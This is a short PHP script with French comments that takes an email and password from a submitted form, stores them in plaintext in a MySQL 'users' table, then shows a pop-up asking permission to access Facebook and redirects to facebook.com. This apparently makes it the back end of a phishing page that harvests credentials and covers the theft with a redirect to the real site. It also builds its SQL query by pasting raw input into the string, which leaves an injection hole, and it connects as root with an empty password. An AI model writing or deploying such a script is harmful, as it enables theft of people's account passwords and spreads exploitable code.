<?php
// Connexion à la base de données MySQL
$host = "localhost";
$user = "root";
$password = "";
$dbname = "users";

$conn = mysqli_connect($host, $user, $password, $dbname);

// Vérifier si la connexion a réussi
if (!$conn) {
  die("La connexion à la base de données a échoué: " . mysqli_connect_error());
}

// Récupérer les données du formulaire
$email = $_POST['email'];
$password = $_POST['password'];

// Insérer les données dans la base de données
$sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";

if (mysqli_query($conn, $sql)) {
  echo '<script>alert("Autorisez-vous à accéder à la page facebook?"); window.location.href = "http://www.facebook.com";</script>';
} else {
  echo "Erreur: " . mysqli_error($conn);
}

// Fermer la connexion à la base de données
mysqli_close($conn);
?>
